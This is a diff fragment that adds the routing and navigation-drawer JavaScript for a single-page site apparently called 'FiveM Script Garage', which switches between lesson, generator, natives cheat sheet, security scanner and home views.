+      var L = LESSONS.find(function (l) { return l.id === lessonId; });
+      main.innerHTML = renderLesson(L); bindLesson(L);
+      document.title = L.title + ' · FiveM Script Garage';
+      if (current.view === 'security') { var sc = $('#scanner'); if (sc) { sc.scrollIntoView(); closeNav(); return; } }
+    } else if (current.view === 'generator') { main.innerHTML = renderGenerator(); bindGenerator(); document.title = 'Resource generator · FiveM Script Garage'; }
+    else if (current.view === 'natives') { main.innerHTML = renderNatives(); bindNatives(); document.title = 'Native cheat sheet · FiveM Script Garage'; }
+    else { main.innerHTML = renderHome(); bindHome(); document.title = 'FiveM Script Garage'; }
+    closeNav();
+    window.scrollTo(0, 0);
+  }
+  function closeNav() { document.body.classList.remove('nav-open'); $('#menuBtn').setAttribute('aria-expanded', 'false'); }
+  window.addEventListener('hashchange', render);
+  $('#menuBtn').addEventListener('click', function () {
+    var open = document.body.classList.toggle('nav-open');
+    $('#menuBtn').setAttribute('aria-expanded', String(open));
+  });
+  $('#scrim').addEventListener('click', closeNav);
+  // tapping the page you are already on fires no hashchange, so close the drawer here too
+  $('#side').addEventListener('click', function (e) { if (e.target.closest('a[href^="#"]')) closeNav(); });
+  document.addEventListener('keydown', function (e) { if (e.key === 'Escape') closeNav(); });
+  render();
+})();
+</script>
